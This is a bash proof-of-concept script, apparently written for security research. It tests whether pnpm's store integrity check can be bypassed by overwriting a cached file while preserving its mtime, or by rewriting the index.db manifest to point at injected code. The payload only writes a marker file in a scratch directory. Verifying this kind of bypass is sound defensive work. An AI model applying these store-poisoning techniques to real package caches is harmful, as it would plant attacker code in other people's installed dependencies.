#!/usr/bin/env bash
#
# verify-h4.sh — does rewriting the pnpm store MANIFEST (not the bytes) defeat
#                verify-store-integrity?
#
# The store keeps content blobs at files/<hash> (self-verifying: path == hash)
# AND a per-package manifest in v11/index.db mapping each file to its expected
# hash. verify-store-integrity checks content against the manifest. This asks
# whether the manifest itself is trusted: if so, repointing it at attacker
# content placed at a valid hash installs the attacker's bytes with the check on.
#
# Cells, all offline with verify-store-integrity=true:
#   control   no poison                          -> installs clean (proves offline works)
#   h2        poison bytes in place, keep mtime  -> poison installs (mtime fast path)
#   h4        rewrite manifest -> new blob        -> poison installs
# Plus a cross-session check: a second project shares the h4-poisoned store.
#
# pnpm skips re-hashing a store file whose mtime matches index.db's record
# (second granularity). So h2 preserves mtime; bumping it >=1s fails closed.
# Deleting index.db is NOT a clean negative control for verification: it also
# breaks a CLEAN offline install, because the manifest is required to install.
#
# Needs bash, node, pnpm, python3, sqlite3, and network for the initial warm.
# Touches only its own scratch dir. Does not read or write the ShipIt repo.
#
# Usage: ./verify-h4.sh [--dir DIR] [--pkg NAME@VER] [--probe RELPATH]

set -uo pipefail
SCRATCH="${TMPDIR:-/tmp}/verify-h4.$$"
PKG_SPEC="is-odd@3.0.1"
PROBE_REL=""
while [ $# -gt 0 ]; do
  case "$1" in
    --dir) SCRATCH="$2"; shift 2 ;;
    --pkg) PKG_SPEC="$2"; shift 2 ;;
    --probe) PROBE_REL="$2"; shift 2 ;;
    -h|--help) sed -n '2,24p' "$0"; exit 0 ;;
    *) echo "unknown argument: $1" >&2; exit 1 ;;
  esac
done
PKG_NAME="${PKG_SPEC%@*}"; PKG_VER="${PKG_SPEC#*@}"
[ -n "$PROBE_REL" ] || PROBE_REL="node_modules/.pnpm/$PKG_NAME@$PKG_VER/node_modules/$PKG_NAME/index.js"
SQ="$(command -v sqlite3 || echo /opt/android-sdk/platform-tools/sqlite3)"
command -v pnpm >/dev/null || { echo "pnpm not on PATH" >&2; exit 1; }
[ -x "$SQ" ] || { echo "sqlite3 not found" >&2; exit 1; }

warm() { # $1 dir  -> a warmed store + project at $1/{store,proj}
  rm -rf "$1"; mkdir -p "$1/proj"
  printf '{"name":"p","version":"1.0.0","dependencies":{"%s":"%s"}}' "$PKG_NAME" "$PKG_VER" > "$1/proj/package.json"
  ( cd "$1/proj" && pnpm --store-dir "$1/store" install --silent ) >"$1/warm.log" 2>&1
}
offline_install() { ( cd "$1/proj" && pnpm --store-dir "$1/store" --offline --config.verify-store-integrity=true install --silent ) >"$1/inst.log" 2>&1; }

echo "pnpm $(pnpm --version)  pkg $PKG_SPEC"

# --- control: clean offline reinstall ---
C="$SCRATCH/control"; warm "$C" || { echo "warm failed; see $C/warm.log"; exit 1; }
rm -rf "$C/proj/node_modules"; offline_install "$C"; crc=$?
head -c 40 "$C/proj/$PROBE_REL" 2>/dev/null | grep -q . && cbytes=present || cbytes=absent
echo "control        rc=$crc  probe=$cbytes  (expect rc=0 present)"

# --- h2: poison bytes in place, PRESERVING mtime ---
# pnpm's fast path skips re-hashing when the store file's mtime matches what
# index.db recorded (second granularity), so the poison must preserve mtime to
# defeat verify-store-integrity. This is the attacker's real move (touch -r is
# trivial). A control that bumps mtime by >=1s instead fails closed — so this
# cell asserts the INSTALLED BYTES, not just rc, and does not assume timing.
H2="$SCRATCH/h2"; warm "$H2"
ino=$(stat -c %i "$H2/proj/$PROBE_REL"); e=$(find "$H2/store" -inum "$ino" | head -1); s=$(stat -c %s "$e")
cp "$e" "$H2/ref"
python3 -c "open('$e','wb').write(b'POISON'+b'x'*($s-6))"; touch -r "$H2/ref" "$e"
rm -rf "$H2/proj/node_modules"; offline_install "$H2"; h2rc=$?
grep -q POISON "$H2/proj/$PROBE_REL" 2>/dev/null && h2poison=INSTALLED || h2poison=absent
echo "h2 mtime-kept  rc=$h2rc  poison=$h2poison  (mtime preserved -> poison INSTALLED; bump mtime >=1s -> fails closed)"

# --- h4: rewrite the manifest to point at attacker content at a valid hash ---
H4="$SCRATCH/h4"; warm "$H4"
ino=$(stat -c %i "$H4/proj/$PROBE_REL"); e=$(find "$H4/store" -inum "$ino" | head -1)
oldhash="$(basename "$(dirname "$e")")$(basename "$e")"; osize=$(stat -c %s "$e")
python3 - "$H4" "$oldhash" "$osize" "$SQ" <<'PY'
import sys,hashlib,os,sqlite3
root,oldhash,osize=sys.argv[1],sys.argv[2],int(sys.argv[3])
payload=b"module.exports=function(){require('fs').writeFileSync('%s/PWNED','1');return true};//"%root.encode()
poison=(payload+b"x"*max(0,osize-len(payload)))[:osize] if osize>=len(payload) else payload
newhash=hashlib.sha512(poison).hexdigest()
dest=os.path.join(root,"store/v11/files",newhash[:2],newhash[2:]); os.makedirs(os.path.dirname(dest),exist_ok=True)
open(dest,"wb").write(poison)
db=os.path.join(root,"store/v11/index.db"); con=sqlite3.connect(db); cur=con.cursor(); hit=0
for key,data in cur.execute("select key,data from package_index").fetchall():
    if oldhash.encode() in data:
        nd=data.replace(oldhash.encode(),newhash.encode()); assert len(nd)==len(data)
        cur.execute("update package_index set data=? where key=?",(nd,key)); hit+=1
con.commit(); con.close(); print("  manifest rows rewritten:",hit)
PY
rm -rf "$H4/proj/node_modules"; offline_install "$H4"; h4rc=$?
[ -f "$H4/PWNED" ] && exec_marker="EXECUTED" || exec_marker="not executed (no postinstall; runs on require)"
grep -q "writeFileSync" "$H4/proj/$PROBE_REL" 2>/dev/null && h4poison=INSTALLED || h4poison=absent
echo "h4 manifest    rc=$h4rc  poison=$h4poison  install-exec=$exec_marker"

# --- cross-session: a second repo sharing the h4-poisoned store ---
mkdir -p "$H4/proj2"; printf '{"name":"q","version":"1.0.0","dependencies":{"%s":"%s"}}' "$PKG_NAME" "$PKG_VER" > "$H4/proj2/package.json"
( cd "$H4/proj2" && pnpm --store-dir "$H4/store" --offline --config.verify-store-integrity=true install --silent ) >"$H4/proj2.log" 2>&1; xrc=$?
grep -q "writeFileSync" "$H4/proj2/$PROBE_REL" 2>/dev/null && xpoison=INSTALLED || xpoison=absent
echo "cross-session  rc=$xrc  poison=$xpoison  (second repo, same store)"

echo
echo "CONFIRMED if: control present; h2 (mtime preserved) poison=INSTALLED; h4 poison=INSTALLED; cross-session poison=INSTALLED."
